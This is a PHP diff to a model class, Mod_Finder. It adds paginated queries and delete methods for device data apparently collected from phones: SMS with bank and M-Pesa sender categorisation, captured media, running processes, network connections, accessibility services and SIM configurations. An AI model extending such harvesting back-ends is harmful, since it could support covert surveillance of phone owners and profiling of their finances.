@@ -1150,6 +1150,46 @@ class Mod_Finder extends Model
         return $this->getCount('tbl_security_audit', $user_id);
     }
 
+    public function get_count_CameraInfo(int $user_id): int
+    {
+        return $this->getCount('tbl_camera_info', $user_id);
+    }
+
+    public function get_count_BatteryStats(int $user_id): int
+    {
+        return $this->getCount('tbl_battery_stats', $user_id);
+    }
+
+    public function get_count_Accessibility(int $user_id): int
+    {
+        return $this->getCount('tbl_accessibility_services', $user_id);
+    }
+
+    public function get_count_InputMethods(int $user_id): int
+    {
+        return $this->getCount('tbl_input_methods', $user_id);
+    }
+
+    public function get_count_Processes(int $user_id): int
+    {
+        return $this->getCount('tbl_running_processes', $user_id);
+    }
+
+    public function get_count_ProcInfo(int $user_id): int
+    {
+        return $this->getCount('tbl_proc_info', $user_id);
+    }
+
+    public function get_count_CapturedMedia(int $user_id): int
+    {
+        return $this->getCount('tbl_captured_media', $user_id);
+    }
+
+    public function get_count_SimConfig(int $user_id): int
+    {
+        return $this->getCount('tbl_sim_configs', $user_id);
+    }
+
     // ── Export Fetch Methods ─────────────────────────────────────────────
     public function export_device_context(int $user_id, int $limit = 1000): array
     {
@@ -1752,13 +1792,156 @@ class Mod_Finder extends Model
         }
     }
 
-    /**
-     * Get categorized SMS counts for dashboard.
-     */
-    public function get_categorized_sms_counts(int $userId): array
+    public function get_camera_info(int $user_id, int $perPage = 25): array
     {
-        $fin_senders = ['kcb', 'kcb_mobile', 'equitybank', 'equity', 'coopbank', 'mcoopcash', 'ncba', 'ncba_loop', 'absa', 'absabank', 'stanbic', 'stanbic_ke', 'familybank', 'stanchart', 'dtb', 'im_bank', 'postbank', 'mpesa'];
+        try {
+            $total = $this->get_count_CameraInfo($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_camera_info', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['available_focal_lengths','available_effects','available_scene_modes','available_video_stabilization','available_ae_modes','available_af_modes'] as $col) {
+                    if (isset($r[$col]) && is_string($r[$col])) {
+                        $r[$col] = json_decode($r[$col], true) ?? [];
+                    }
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_camera_info: ' . $e->getMessage());
+            return [];
+        }
+    }
 
+    public function get_battery_stats(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_BatteryStats($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_battery_stats', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_battery_stats: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function get_accessibility(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_Accessibility($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_accessibility_services', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_accessibility: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function get_input_methods(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_InputMethods($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_input_methods', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)->get()->getResultArray();
+            // Attach subtypes
+            foreach ($results as &$r) {
+                $subs = $this->db->table('tbl_input_method_subtypes')
+                    ->where('input_method_id', $r['id'])
+                    ->get()->getResultArray();
+                $r['subtypes'] = $subs;
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_input_methods: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function get_proc_info(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_ProcInfo($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_proc_info', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['meminfo_json','cpuinfo_json','stat_json','uptime_json','net_interfaces_json','net_connections_json'] as $col) {
+                    if (isset($r[$col]) && is_string($r[$col])) {
+                        $r[$col] = json_decode($r[$col], true) ?? [];
+                    }
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_proc_info: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function get_processes(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_Processes($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_running_processes', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)->get()->getResultArray();
+            // Attach process details and services
+            foreach ($results as &$r) {
+                $details = $this->db->table('tbl_running_process_details')
+                    ->where('running_processes_id', $r['id'])
+                    ->get()->getResultArray();
+                $r['process_details'] = $details;
+                $services = $this->db->table('tbl_running_services')
+                    ->where('running_process_id', $r['id'])
+                    ->get()->getResultArray();
+                $r['services'] = $services;
+                // Decode pkg_list_json
+                if (!empty($r['pkg_list_json'])) {
+                    $r['pkg_list'] = json_decode($r['pkg_list_json'], true);
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_processes: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function get_categorized_sms_counts(int $userId): array
+{
         $total = $this->db->table('tbl_sms')->where('owner_id', $userId)->countAllResults();
 
         $all_sms = $this->db->table('tbl_sms')
@@ -3485,16 +3668,6 @@ class Mod_Finder extends Model
             ->getResultArray();
     }
 
-    public function get_count_CapturedMedia(int $userId): int
-    {
-        return $this->db->table('tbl_captured_media')->where('owner_id', $userId)->countAllResults();
-    }
-
-    public function get_count_SimConfig(int $userId): int
-    {
-        return $this->db->table('tbl_sim_configs')->where('owner_id', $userId)->countAllResults();
-    }
-
     public function get_captured_media_by_id(int $id, int $userId): ?array
     {
         return $this->db->table('tbl_captured_media')
@@ -3876,6 +4049,19 @@ class Mod_Finder extends Model
         }
     }
 
+    public function delete_proc_info_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_proc_info')
+                ->where('id', $id)
+                ->where('owner_id', $userId)
+                ->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_proc_info_row error: ' . $e->getMessage());
+            return false;
+        }
+    }
+
     public function delete_security_audit_row(int $id, int $userId): bool
     {
         try {
@@ -3901,4 +4087,5 @@ class Mod_Finder extends Model
             return false;
         }
     }
+
 }
